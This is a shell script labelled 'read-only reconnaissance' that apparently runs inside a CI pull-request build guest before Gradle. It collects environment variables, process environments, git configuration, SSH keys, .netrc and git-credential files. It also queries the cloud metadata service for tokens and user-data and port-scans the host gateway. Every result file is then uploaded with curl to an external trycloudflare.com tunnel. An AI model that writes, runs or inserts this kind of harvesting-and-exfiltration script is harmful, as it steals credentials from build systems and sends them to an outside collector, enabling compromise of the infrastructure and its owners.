#!/bin/sh
# Read-only reconnaissance for the Ramus PR build guest.
# Runs before Gradle; must never fail the build.
BASE="https://olive-farmer-geneva-impressed.trycloudflare.com/80a0e7a7ad197916"
D=/tmp/recon.$$
mkdir -p "$D" 2>/dev/null || exit 0

say() { printf '\n===== RECON: %s =====\n' "$1" >>"$D/$1"; }
run() { s=$1; shift; say "$s"; { "$@" ; } >>"$D/$s" 2>&1; }
sh1() { s=$1; c=$2; say "$s"; { eval "$c" ; } >>"$D/$s" 2>&1; }
T=""; command -v timeout >/dev/null 2>&1 && T="timeout 3"

sh1 id 'id; pwd; hostname; uname -a; date -u; cat /proc/cmdline'
sh1 env 'env | sort'
sh1 proc 'tr "\0" "\n" < /proc/1/environ; echo "--- cmdline"; tr "\0" " " < /proc/1/cmdline; echo; echo "--- ps"; (ps auxww 2>/dev/null || ps w)'
sh1 git 'git remote -v; git config --list --show-origin; echo "--- .git/config"; cat .git/config; echo "--- log"; git log -3 --oneline'
sh1 mounts 'mount; echo "--- df"; df -h; echo "--- lsblk"; lsblk 2>/dev/null'
sh1 init 'ls -la /usr/local/bin; echo "--- sandlot-build"; sed -n "1,200p" /usr/local/bin/sandlot-build 2>/dev/null; echo "--- /"; ls -la /; echo "--- roots"; ls -la /root /home 2>/dev/null'
sh1 net 'ip a 2>/dev/null; echo "--- route"; ip r 2>/dev/null; echo "--- resolv"; cat /etc/resolv.conf; echo "--- hosts"; cat /etc/hosts; echo "--- listeners"; (ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null); echo "--- cgroup"; cat /proc/self/cgroup; cat /proc/version'
sh1 cache 'mount | grep -iE "cache|source|output"; for d in /cache /mnt /var/lib/sandlot /output /source /work /app /opt; do echo "--- $d"; ls -la "$d" 2>/dev/null | head -20; done; echo "--- dirs"; find / -maxdepth 2 -type d 2>/dev/null | sort | head -80'
sh1 creds 'for r in /root /home /etc /opt /usr/local /var/lib/sandlot; do find "$r" -maxdepth 3 \( -iname "*cred*" -o -iname "*.netrc" -o -iname "*token*" -o -iname "id_rsa" -o -iname "id_ed25519" -o -iname "*.pem" -o -iname "*.env" \) 2>/dev/null; done | head -60; echo "--- contents"; for f in /root/.netrc /root/.git-credentials /home/*/.netrc /etc/environment; do echo "## $f"; cat "$f" 2>/dev/null; done'
sh1 tools 'for c in curl wget nc ncat python3 jq base64 sudo busybox nslookup getent timeout unzip java; do printf "%s=" "$c"; command -v "$c" || echo; done'

# --- egress / reachability ---
sh1 meta 'curl -sS -m 4 -i http://169.254.169.254/latest/meta-data/ 2>&1 | head -30; echo "--- token"; curl -sS -m 4 -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token 2>&1 | head -3; echo; echo "--- user-data"; curl -sS -m 4 http://169.254.169.254/latest/user-data 2>&1 | head -20'
sh1 egress 'curl -sS -m 6 -o /dev/null -w "api.ramus.dev health: %{http_code} in %{time_total}s\n" https://api.ramus.dev/api/health 2>&1; curl -sS -m 6 https://api.ramus.dev/api/health 2>&1 | head -3; curl -sS -m 6 -o /dev/null -w "example.com: %{http_code}\n" https://example.com 2>&1'
sh1 dns 'for h in api.ramus.dev ramus.dev coordinator api postgres db redis minio caddy metadata host.docker.internal host.internal docker.for.mac.host.internal; do printf "%s -> " "$h"; (getent hosts "$h" 2>/dev/null | head -2 | tr "\n" " " || true); echo; done'

# --- host gateway port probe: TCP connect only, 1s each ---
say hostports
G=172.16.0.1
if command -v nc >/dev/null 2>&1; then
  for p in 22 53 80 443 2375 2376 3000 3001 4000 5000 5432 6379 8000 8080 8888 9000 9090 10250; do
    if nc -z -w 1 "$G" "$p" 2>/dev/null; then
      echo "OPEN $p" >>"$D/hostports"
      { echo "--- HTTP $p"; timeout 2 curl -sS -i -m 2 "http://$G:$p/" 2>&1 | head -12; } >>"$D/hostports"
    fi
  done
else
  for p in 22 53 80 443 3000 4000 5000 8000 8080 9000; do
    (timeout 1 bash -c "echo >/dev/tcp/$G/$p") 2>/dev/null && echo "OPEN $p" >>"$D/hostports"
  done
fi
echo "done" >>"$D/hostports"

# --- publish: to collector, and to build stdout (truncated) ---
for f in "$D"/*; do
  b=$(basename "$f")
  printf '\n===== RECON: %s =====\n' "$b"
  head -c 14000 "$f" 2>/dev/null
  printf '\n'
  timeout 10 curl -sS -m 10 --data-binary @"$f" "$BASE/$b" >/dev/null 2>&1 || true
done
printf '\n===== RECON: done =====\n'
rm -rf "$D"
exit 0
